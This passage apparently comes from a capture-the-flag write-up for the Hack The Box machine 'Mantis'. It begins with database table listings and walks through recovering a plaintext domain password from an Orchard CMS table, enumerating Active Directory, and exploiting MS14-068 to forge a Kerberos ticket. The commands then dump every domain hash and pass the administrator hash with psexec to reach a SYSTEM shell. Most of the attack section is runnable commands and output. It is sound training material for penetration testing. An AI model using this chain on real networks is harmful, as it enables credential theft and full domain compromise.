orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_ContentPicker_ContentMenuItemPartRecord                                                                               b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Alias_AliasRecord                                                                                                     b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Alias_ActionRecord                                                                                                    b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Autoroute_AutoroutePartRecord                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Users_UserPartRecord                                                                                                  b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Roles_PermissionRecord                                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Roles_RoleRecord                                                                                                      b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Roles_RolesPermissionsRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Roles_UserRolesPartRecord                                                                                             b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Packaging_PackagingSource                                                                                             b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Recipes_RecipeStepResultRecord                                                                                        b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_OutputCache_CacheParameterRecord                                                                                      b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_MediaProcessing_ImageProfilePartRecord                                                                                b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_MediaProcessing_FilterRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_MediaProcessing_FileNameRecord                                                                                        b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Widgets_LayerPartRecord                                                                                               b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Widgets_WidgetPartRecord                                                                                              b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Comments_CommentPartRecord                                                                                            b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Comments_CommentsPartRecord                                                                                           b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Taxonomies_TaxonomyPartRecord                                                                                         b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Taxonomies_TermPartRecord                                                                                             b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Taxonomies_TermContentItem                                                                                            b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Taxonomies_TermsPartRecord                                                                                            b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_MediaLibrary_MediaPartRecord                                                                                          b'BASE TABLE'

orcharddb                                                                                                                          dbo                                                                                                                                blog_Orchard_Blogs_BlogPartArchiveRecord                                                                                           b'BASE TABLE'
```

The table `blog_Orchard_Users_UserPartRecord` could contain user account credentials. Dump it.

```sql
select * from blog_Orchard_Users_UserPartRecord;
         Id   UserName                                                                                                                                                                                                                                                          Email                                                                                                                                                                                                                                                             NormalizedUserName                                                                                                                                                                                                                                                Password                                                                                                                                                                                                                                                          PasswordFormat                                                                                                                                                                                                                                                    HashAlgorithm                                                                                                                                                                                                                                                     PasswordSalt                                                                                                                                                                                                                                                      RegistrationStatus                                                                                                                                                                                                                                                EmailStatus                                                                                                                                                                                                                                                       EmailChallengeToken                                                                                                                                                                                                                                               CreatedUtc            LastLoginUtc          LastLogoutUtc 

-----------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -------------------   -------------------   -------------------

          2   admin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               admin                                                                                                                                                                                                                                                             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                                                                                              Hashed                                                                                                                                                                                                                                                            PBKDF2                                                                                                                                                                                                                                                            UBwWF1CQCsaGc/P7jIR/kg==                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          NULL                                                                                                                                                                                                                                                              2017-09-01 13:44:01   2017-09-01 14:03:50   2017-09-01 14:06:31

         15   James                                                                                                                                                                                                                                                             james@htb.local                                                                                                                                                                                                                                                   james                                                                                                                                                                                                                                                             J@m3s_P@ssW0rd!                                                                                                                                                                                                                                                   Plaintext                                                                                                                                                                                                                                                         Plaintext                                                                                                                                                                                                                                                         NA                                                                                                                                                                                                                                                                Approved                                                                                                                                                                                                                                                          Approved                                                                                                                                                                                                                                                          NULL                                                                                                                                                                                                                                                              2017-09-01 13:45:44   NULL                  NULL          
```

Indeed, the table contains the hashed password of the `admin` user and the plaintext password of the `james` user, who appears to be a domain user account. Use `crackmapexec` to verify that the credential is valid.

```bash
$ crackmapexec smb 10.129.202.88 -d htb.local -u james -p 'J@m3s_P@ssW0rd!'
SMB         10.129.202.88   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.202.88   445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!
```

---

## SMB Enumeration as `james`

```bash
$ smbmap -H 10.129.202.88 -u james -d htb.local -p 'J@m3s_P@ssW0rd!'
[+] IP: 10.129.202.88:445       Name: 10.129.202.88
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

No non-standard shares here.

---

## Domain Enumeration

### Domain Controllers

```bash
$ pywerview get-netdomaincontroller -w htb.local -u james -p 'J@m3s_P@ssW0rd!' --dc-ip 10.129.202.88 -d htb.local
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            MANTIS
codepage:                      0
countrycode:                   0
distinguishedname:             CN=MANTIS,OU=Domain Controllers,DC=htb,DC=local
dnshostname:                   mantis.htb.local
dscorepropagationdata:         2017-09-01 00:08:44,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-17 10:00:52.544888
lastlogontimestamp:            132816348514840860
localpolicyflags:              0
logoncount:                    111
msdfsr-computerreferencebl:    CN=MANTIS,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
msds-supportedencryptiontypes: 31
name:                          MANTIS
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    5b5d52a1-e5b4-4163-b'981e'-84906ef494d2
objectsid:                     S-1-5-21-4220043660-4019079961-2895681657-1000
operatingsystem:               Windows Server 2008 R2 Standard
operatingsystemservicepack:    Service Pack 1
operatingsystemversion:        6.1 (7601)
primarygroupid:                516
pwdlastset:                    2021-11-17 10:00:40.174066
ridsetreferences:              CN=RID Set,CN=MANTIS,OU=Domain Controllers,DC=htb,DC=local
samaccountname:                MANTIS$
samaccounttype:                805306369
serverreferencebl:             CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
serviceprincipalname:          ldap/mantis.htb.local/ForestDnsZones.htb.local,
                               ldap/mantis.htb.local/DomainDnsZones.htb.local,
                               TERMSRV/MANTIS,
                               TERMSRV/mantis.htb.local,
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/mantis.htb.local,
                               DNS/mantis.htb.local,
                               GC/mantis.htb.local/htb.local,
                               RestrictedKrbHost/mantis.htb.local,
                               RestrictedKrbHost/MANTIS,
                               HOST/MANTIS/HTB,
                               HOST/mantis.htb.local/HTB,
                               HOST/MANTIS,
                               HOST/mantis.htb.local,
                               HOST/mantis.htb.local/htb.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/240d2c58-724d-439d-9c2e-b3a707cb416c/htb.local,
                               ldap/MANTIS/HTB,
                               ldap/240d2c58-724d-439d-9c2e-b3a707cb416c._msdcs.htb.local,
                               ldap/mantis.htb.local/HTB,
                               ldap/MANTIS,
                               ldap/mantis.htb.local,
                               ldap/mantis.htb.local/htb.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    127012
usncreated:                    12293
whenchanged:                   2021-11-17 15:00:51
whencreated:                   2017-09-01 00:05:39
```

The target appears to be the only domain controller in the domain.

### Domain Computers

```bash
$ pywerview get-netcomputer -w htb -u james -p 'J@m3s_P@ssW0rd!' --dc-ip 10.129.202.88 --full-data
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            MANTIS
codepage:                      0
countrycode:                   0
distinguishedname:             CN=MANTIS,OU=Domain Controllers,DC=htb,DC=local
dnshostname:                   mantis.htb.local
dscorepropagationdata:         2017-09-01 00:08:44,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-17 10:00:52.544888
lastlogontimestamp:            132816348514840860
localpolicyflags:              0
logoncount:                    111
msdfsr-computerreferencebl:    CN=MANTIS,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
msds-supportedencryptiontypes: 31
name:                          MANTIS
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    5b5d52a1-e5b4-4163-b'981e'-84906ef494d2
objectsid:                     S-1-5-21-4220043660-4019079961-2895681657-1000
operatingsystem:               Windows Server 2008 R2 Standard
operatingsystemservicepack:    Service Pack 1
operatingsystemversion:        6.1 (7601)
primarygroupid:                516
pwdlastset:                    2021-11-17 10:00:40.174066
ridsetreferences:              CN=RID Set,CN=MANTIS,OU=Domain Controllers,DC=htb,DC=local
samaccountname:                MANTIS$
samaccounttype:                805306369
serverreferencebl:             CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
serviceprincipalname:          ldap/mantis.htb.local/ForestDnsZones.htb.local,
                               ldap/mantis.htb.local/DomainDnsZones.htb.local,
                               TERMSRV/MANTIS,
                               TERMSRV/mantis.htb.local,
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/mantis.htb.local,
                               DNS/mantis.htb.local,
                               GC/mantis.htb.local/htb.local,
                               RestrictedKrbHost/mantis.htb.local,
                               RestrictedKrbHost/MANTIS,
                               HOST/MANTIS/HTB,
                               HOST/mantis.htb.local/HTB,
                               HOST/MANTIS,
                               HOST/mantis.htb.local,
                               HOST/mantis.htb.local/htb.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/240d2c58-724d-439d-9c2e-b3a707cb416c/htb.local,
                               ldap/MANTIS/HTB,
                               ldap/240d2c58-724d-439d-9c2e-b3a707cb416c._msdcs.htb.local,
                               ldap/mantis.htb.local/HTB,
                               ldap/MANTIS,
                               ldap/mantis.htb.local,
                               ldap/mantis.htb.local/htb.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    127012
usncreated:                    12293
whenchanged:                   2021-11-17 15:00:51
whencreated:                   2017-09-01 00:05:39
```

The target is also the only computer account in the domain. It is configured with unconstrained delegation, since it is a domain controller.

### Domain Users

```bash
$ pywerview get-netuser -w htb.local -u james -p 'J@m3s_P@ssW0rd!' --dc-ip 10.129.202.88
accountexpires:                0
admincount:                    1
badpasswordtime:               2017-12-23 22:31:45.681013
badpwdcount:                   0
cn:                            Administrator
codepage:                      0
countrycode:                   0
description:                   Built-in account for administering the computer/domain
distinguishedname:             CN=Administrator,CN=Users,DC=htb,DC=local
dscorepropagationdata:         2017-09-01 00:20:49,
                               2017-09-01 00:20:49,
                               2017-09-01 00:08:44,
                               1601-01-01 18:12:16
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-02-09 03:51:20.376621
lastlogontimestamp:            132572738280312629
logoncount:                    50
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:                      CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local,
                               CN=Domain Admins,CN=Users,DC=htb,DC=local,
                               CN=Enterprise Admins,CN=Users,DC=htb,DC=local,
                               CN=Schema Admins,CN=Users,DC=htb,DC=local,
                               CN=Performance Log Users,CN=Builtin,DC=htb,DC=local,
                               CN=Administrators,CN=Builtin,DC=htb,DC=local
msds-supportedencryptiontypes: 0
name:                          Administrator
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    fa9f05c7-c7c8-472a-b'8981'-12cd70297767
objectsid:                     S-1-5-21-4220043660-4019079961-2895681657-500
primarygroupid:                513
profilepath:
pwdlastset:                    2018-02-06 02:52:39.300630
samaccountname:                Administrator
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:                    114727
usncreated:                    8196
whenchanged:                   2021-02-08 16:03:48
whencreated:                   2017-09-01 00:05:19

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     Guest
codepage:               0
countrycode:            0
description:            Built-in account for guest access to the computer/domain
distinguishedname:      CN=Guest,CN=Users,DC=htb,DC=local
dscorepropagationdata:  2017-09-01 00:08:44,
                        1601-01-01 00:00:01
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Guests,CN=Builtin,DC=htb,DC=local
name:                   Guest
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             143663b0-d9bc-4cc1-b'adcf'-5d8e592f9399
objectsid:              S-1-5-21-4220043660-4019079961-2895681657-501
primarygroupid:         514
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         Guest
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8197
usncreated:             8197
whenchanged:            2017-09-01 00:05:19
whencreated:            2017-09-01 00:05:19

accountexpires:         9223372036854775807
admincount:             1
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     krbtgt
codepage:               0
countrycode:            0
description:            Key Distribution Center Service Account
distinguishedname:      CN=krbtgt,CN=Users,DC=htb,DC=local
dscorepropagationdata:  2017-09-01 00:20:49,
                        2017-09-01 00:08:44,
                        1601-01-01 00:04:16
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
name:                   krbtgt
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             88800d2b-a5d9-4136-b'af0f'-6b241f66bf69
objectsid:              S-1-5-21-4220043660-4019079961-2895681657-502
primarygroupid:         513
profilepath:
pwdlastset:             2017-08-31 20:05:39.343617
samaccountname:         krbtgt
samaccounttype:         805306368
scriptpath:
serviceprincipalname:   kadmin/changepw
showinadvancedviewonly: TRUE
useraccountcontrol:     ['ACCOUNTDISABLE', 'NORMAL_ACCOUNT']
usnchanged:             12765
usncreated:             12324
whenchanged:            2017-09-01 00:20:49
whencreated:            2017-09-01 00:05:39

accountexpires:        9223372036854775807
badpasswordtime:       2017-12-24 09:39:00.258106
badpwdcount:           0
cn:                    James
codepage:              0
countrycode:           0
displayname:           James
distinguishedname:     CN=James,OU=HTB,DC=htb,DC=local
dscorepropagationdata: 2017-09-01 00:09:13,
                       1601-01-01 00:00:00
givenname:             James
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             2017-12-24 09:39:48.493390
lastlogontimestamp:    132816358085925671
logoncount:            26
memberof:              CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local
name:                  James
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            bc1bf744-ff26-479b-b'826b'-d47d0061e143
objectsid:             S-1-5-21-4220043660-4019079961-2895681657-1103
primarygroupid:        513
profilepath:
pwdlastset:            2017-08-31 20:12:02.495890
samaccountname:        james
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     james@htb.local
usnchanged:            127040
usncreated:            12705
whenchanged:           2021-11-17 15:16:48
whencreated:           2017-09-01 00:09:13
```

`james` is the only non-standard user account in the domain.

### Domain Groups

```bash
$ pywerview get-netgroup -w htb.local -u james -p 'J@m3s_P@ssW0rd!' --dc-ip 10.129.202.88
samaccountname: Administrators
samaccountname: Users
samaccountname: Guests
samaccountname: Print Operators
samaccountname: Backup Operators
samaccountname: Replicator
samaccountname: Remote Desktop Users
samaccountname: Network Configuration Operators
samaccountname: Performance Monitor Users
samaccountname: Performance Log Users
samaccountname: Distributed COM Users
samaccountname: IIS_IUSRS
samaccountname: Cryptographic Operators
samaccountname: Event Log Readers
samaccountname: Certificate Service DCOM Access
samaccountname: Domain Computers
samaccountname: Domain Controllers
samaccountname: Schema Admins
samaccountname: Enterprise Admins
samaccountname: Cert Publishers
samaccountname: Domain Admins
samaccountname: Domain Users
samaccountname: Domain Guests
samaccountname: Group Policy Creator Owners
samaccountname: RAS and IAS Servers
samaccountname: Server Operators
samaccountname: Account Operators
samaccountname: Pre-Windows 2000 Compatible Access
samaccountname: Incoming Forest Trust Builders
samaccountname: Windows Authorization Access Group
samaccountname: Terminal Server License Servers
samaccountname: Allowed RODC Password Replication Group
samaccountname: Denied RODC Password Replication Group
samaccountname: Read-only Domain Controllers
samaccountname: Enterprise Read-only Domain Controllers
samaccountname: DnsAdmins
samaccountname: DnsUpdateProxy
samaccountname: SQLServer2005SQLBrowserUser$MANTIS
```

The `SQLServer2005SQLBrowserUser$MANTIS` group is unusual, but that may just be because the domain controller is hosting a SQL server.

### Domain Graph

Graph the relationships between the domain principals using BloodHound.

```bash
$ bloodhound-python -d htb.local -u james -p 'J@m3s_P@ssW0rd!' -c All -ns 10.129.202.88
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: mantis.htb.local
INFO: Found 4 users
INFO: Found 41 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mantis.htb.local
INFO: Done in 00M 07S
```

The only compelling relationship in the graph is that `james` can RDP into the domain controller.

![](images/Pasted%20image%2020211117104026.png)

---

## MS14-068 to Domain Administrator

Since the target operating system is Windows Server 2008 R2 and domain user credentials have been obtained, it is likely possible to exploit MS14-068 to craft a TGT for `james` with a forged PAC that specifies domain administrative access.

Begin by syncing the attacking machine's time with the target's.

```bash
$ sudo rdate -n 10.129.204.106
Fri Nov 19 22:08:35 EST 2021
```

To exploit MS14-068, the following items are needed:

### Fully Qualified Domain Name

Based on the output from the LDAP ports during open port enumeration, the fully qualified domain name is `htb.local`.

### Fully Qualified Domain Name of the Domain Controller

Based on previous domain enumeration, the fully qualified domain name of the domain controller is `mantis.htb.local`.

### SID of the Compromised Domain User Account

```bash
$ impacket-lookupsid htb.local/james:'J@m3s_P@ssW0rd!'@10.129.204.106
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.129.204.106
[*] StringBinding ncacn_np:10.129.204.106[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4220043660-4019079961-2895681657
498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: HTB\Administrator (SidTypeUser)
501: HTB\Guest (SidTypeUser)
502: HTB\krbtgt (SidTypeUser)
512: HTB\Domain Admins (SidTypeGroup)
513: HTB\Domain Users (SidTypeGroup)
514: HTB\Domain Guests (SidTypeGroup)
515: HTB\Domain Computers (SidTypeGroup)
516: HTB\Domain Controllers (SidTypeGroup)
517: HTB\Cert Publishers (SidTypeAlias)
518: HTB\Schema Admins (SidTypeGroup)
519: HTB\Enterprise Admins (SidTypeGroup)
520: HTB\Group Policy Creator Owners (SidTypeGroup)
521: HTB\Read-only Domain Controllers (SidTypeGroup)
553: HTB\RAS and IAS Servers (SidTypeAlias)
571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
1000: HTB\MANTIS$ (SidTypeUser)
1101: HTB\DnsAdmins (SidTypeAlias)
1102: HTB\DnsUpdateProxy (SidTypeGroup)
1103: HTB\james (SidTypeUser)
1104: HTB\SQLServer2005SQLBrowserUser$MANTIS (SidTypeAlias)
```

The SID of `james` is `S-1-5-21-4220043660-4019079961-2895681657-1103`.

### Exploitation

Using the above information, exploit MS14-068 to craft a TGT as the user `james` with a forged PAC that grants `james` domain administrator access.

```bash
$ cd pykek
$ sudo python2.7 ms14-068.py -u james@htb.local -s 'S-1-5-21-4220043660-4019079961-2895681657-1103' -p 'J@m3s_P@ssW0rd!' -d mantis.htb.local
  [+] Building AS-REQ for mantis.htb.local... Done!
  [+] Sending AS-REQ to mantis.htb.local... Done!
  [+] Receiving AS-REP from mantis.htb.local... Done!
  [+] Parsing AS-REP from mantis.htb.local... Done!
  [+] Building TGS-REQ for mantis.htb.local... Done!
  [+] Sending TGS-REQ to mantis.htb.local... Done!
  [+] Receiving TGS-REP from mantis.htb.local... Done!
  [+] Parsing TGS-REP from mantis.htb.local... Done!
  [+] Creating ccache file 'TGT_james@htb.local.ccache'... Done!
```

Use the TGT to dump the domain's hashes. Be sure to set the DNS A records for `mantis.htb.local` and `htb.local` to the target's IP address in the local DNS resolver (`/etc/hosts`).

```bash
$ export KRB5CCNAME=/opt/pykek/TGT_james@htb.local.ccache
$ impacket-secretsdump -k -just-dc mantis.htb.local -debug
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: /opt/pykek/TGT_james@htb.local.ccache
[+] Domain retrieved from CCache: HTB.LOCAL
[+] SPN CIFS/MANTIS.HTB.LOCAL@HTB.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/HTB.LOCAL@HTB.LOCAL
[+] Using TGT from cache
[+] Username retrieved from CCache: james
[+] Trying to connect to KDC at HTB.LOCAL
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_YsqbEbmN
[+] Trying to connect to KDC at HTB.LOCAL
[+] Calling DRSCrackNames for S-1-5-21-4220043660-4019079961-2895681657-500
[+] Calling DRSGetNCChanges for {fa9f05c7-c7c8-472a-8981-12cd70297767}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=htb,DC=local
Administrator:500:aad3b435b51404eeaad3b435b51404ee:22140219fd9432e584a355e54b28ecbb:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-4220043660-4019079961-2895681657-501
[+] Calling DRSGetNCChanges for {143663b0-d9bc-4cc1-adcf-5d8e592f9399}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=htb,DC=local
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-4220043660-4019079961-2895681657-502
[+] Calling DRSGetNCChanges for {88800d2b-a5d9-4136-af0f-6b241f66bf69}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=htb,DC=local
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e330665e47f7890603b5a96bbb31e23:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-4220043660-4019079961-2895681657-1103
[+] Calling DRSGetNCChanges for {bc1bf744-ff26-479b-826b-d47d0061e143}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=James,OU=HTB,DC=htb,DC=local
htb.local\james:1103:aad3b435b51404eeaad3b435b51404ee:71b5ea0a10d569ffac56d3b63684b3d2:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-4220043660-4019079961-2895681657-1000
[+] Calling DRSGetNCChanges for {5b5d52a1-e5b4-4163-981e-84906ef494d2}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=MANTIS,OU=Domain Controllers,DC=htb,DC=local
MANTIS$:1000:aad3b435b51404eeaad3b435b51404ee:091389fc8772e32a1c008f488d89ac45:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c06d7bb2e780b417445f0f55c52399de2dbd206a383be45d407b376356cd9170
Administrator:aes128-cts-hmac-sha1-96:ea5a1c528034eac55c6e97af85773352
Administrator:des-cbc-md5:c2d65b4f7abab392
krbtgt:aes256-cts-hmac-sha1-96:fb0175b25239486d1cee94e6fe7f2167017df916981c21ea0542d4460298d18e
krbtgt:aes128-cts-hmac-sha1-96:ddbab1997d4bbd7a6c591f887b739c68
krbtgt:des-cbc-md5:a113768326f10e1a
htb.local\james:aes256-cts-hmac-sha1-96:a5b5099819f72a8b932c8cf10b643fc10fa98f6ef80397c196d3977210846e56
htb.local\james:aes128-cts-hmac-sha1-96:762d8ec29ef72edb6690c52cfe6b91e3
htb.local\james:des-cbc-md5:2085528ca7b67383
MANTIS$:aes256-cts-hmac-sha1-96:7ef43242a60c2f58fb1de6d542eb827dd2cde558c932f2e181bcb34bef5f7fa8
MANTIS$:aes128-cts-hmac-sha1-96:fb4335a72f1a28105616ce2ebb3980b9
MANTIS$:des-cbc-md5:9186c7cbd92f01ef
[*] Cleaning up...
```

Pass the domain administrator's hash to the domain controller via `psexec` and grab the system flag.

```bash
$ impacket-psexec htb.local/Administrator@mantis.htb.local -hashes aad3b435b51404eeaad3b435b51404ee:22140219fd9432e584a355e54b28ecbb
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file nMSvGtfX.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service izgF on mantis.htb.local.....
[*] Starting service izgF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> dir c:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 1A7A-6541

 Directory of c:\users\administrator\desktop

02/08/2021  12:44 PM    <DIR>          .
02/08/2021  12:44 PM    <DIR>          ..
09/01/2017  09:16 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,946,759,680 bytes free
```
